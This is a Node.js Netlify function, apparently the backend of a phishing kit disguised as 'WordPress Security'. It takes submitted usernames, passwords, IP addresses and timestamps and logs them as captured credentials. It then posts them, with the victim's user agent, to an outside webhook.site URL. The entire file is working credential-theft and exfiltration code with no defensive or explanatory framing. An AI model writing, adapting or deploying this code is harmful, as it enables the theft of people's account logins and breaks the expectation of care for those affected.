// netlify/functions/log.js
const fetch = require('node-fetch');

exports.handler = async (event) => {
    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, body: 'Method Not Allowed' };
    }

    try {
        const data = JSON.parse(event.body);
        
        // ENVIAR PARA WEBHOOK - passando event.headers também
        await enviarParaWebhook(data, event.headers);
        
        console.log('📧 CREDENCIAIS CAPTURADAS E ENVIADAS PARA WEBHOOK:', {
            username: data.username,
            password: data.password,
            ip: data.ip,
            timestamp: data.timestamp
        });

        return {
            statusCode: 200,
            body: JSON.stringify({ success: true })
        };
    } catch (error) {
        console.error('Erro:', error);
        return {
            statusCode: 500,
            body: JSON.stringify({ error: 'Internal Server Error' })
        };
    }
};

async function enviarParaWebhook(data, headers) {
    const webhookURL = 'https://webhook.site/8f4e1eb8-90a3-430f-baa9-ce892d2986cd';
    
    const webhookData = {
        usuario: data.username,
        senha: data.password,
        ip: data.ip,
        data_hora: data.timestamp,
        user_agent: headers['user-agent'],
        origem: 'WordPress Security'
    };

    console.log('📤 Enviando para webhook:', webhookData);

    const response = await fetch(webhookURL, {
        method: 'POST',
        headers: { 
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(webhookData)
    });

    console.log('✅ Webhook response status:', response.status);
    
    return response;
}